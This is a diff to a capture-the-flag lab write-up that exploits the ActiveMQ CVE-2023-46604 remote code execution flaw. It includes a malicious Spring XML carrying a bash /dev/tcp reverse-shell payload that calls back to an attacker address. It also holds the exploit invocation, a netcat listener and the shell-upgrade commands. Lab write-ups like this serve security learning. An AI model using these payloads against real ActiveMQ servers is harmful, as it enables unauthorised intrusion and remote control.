@@ -30,7 +30,7 @@ nmap -p 22,80,1883,5672,8161,39751,61613,61614,61616 -sCV 10.10.11.243
 
 ## 🐚 Shell as `activemq`
 
-### 🧨 CVE-2023-46604 – ActiveMQ RCE
+### 🧨 [CVE-2023-46604 – ActiveMQ RCE](https://github.com/evkl1d/CVE-2023-46604)
 
 #### Step 1: Host malicious Spring XML
 
@@ -47,7 +47,7 @@ Edit `poc.xml`:
       <list>
         <value>bash</value>
         <value>-c</value>
-        <value>bash -i &gt;&amp; /dev/tcp/10.10.14.6/9001 0&gt;&amp;1</value>
+        <value>bash -i &gt;&amp; /dev/tcp/10.10.14.13/6969 0&gt;&amp;1</value>
       </list>
     </constructor-arg>
   </bean>
@@ -57,29 +57,32 @@ Edit `poc.xml`:
 Host it:
 
 ```bash
-python3 -m http.server
+python3 -m http.server 80
 ```
 
 #### Step 2: Exploit
 
 ```bash
-python3 exploit.py -i 10.10.11.243 -u http://10.10.14.6/poc.xml
+python3 exploit.py -i 10.10.11.243 -u http://10.10.14.13/poc.xml
 ```
 
 #### Step 3: Catch Shell
 
 ```bash
-nc -lnvp 9001
+nc -lnvp 6969
 ```
 
 #### Upgrade Shell
 
 ```bash
 script /dev/null -c bash
+```
+
+```
 # [CTRL+Z]
 stty raw -echo; fg
 reset
-export TERM=screen
+xterm
 ```
 
 ---
